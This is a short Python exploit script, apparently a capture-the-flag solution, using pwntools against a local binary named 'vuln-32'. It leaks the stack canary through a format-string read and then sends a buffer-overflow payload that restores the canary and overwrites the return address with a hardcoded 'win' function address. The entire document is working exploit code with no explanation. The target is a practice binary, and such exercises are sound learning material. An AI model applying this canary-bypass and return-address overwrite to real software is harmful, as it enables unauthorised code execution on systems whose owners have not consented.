#!/usr/bin/python3
from pwn import *

p = process('./vuln-32')

log.info(p.clean())
p.sendline(b'%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: { hex(canary) }')

offset = 64
pad = 12
win_addr = 0x08049245

payload = flat(
    b'A' * offset,
    canary,
    b'A' * pad,
    win_addr
)

p.clean()
p.sendline(payload)

print(p.clean().decode('latin-1'))
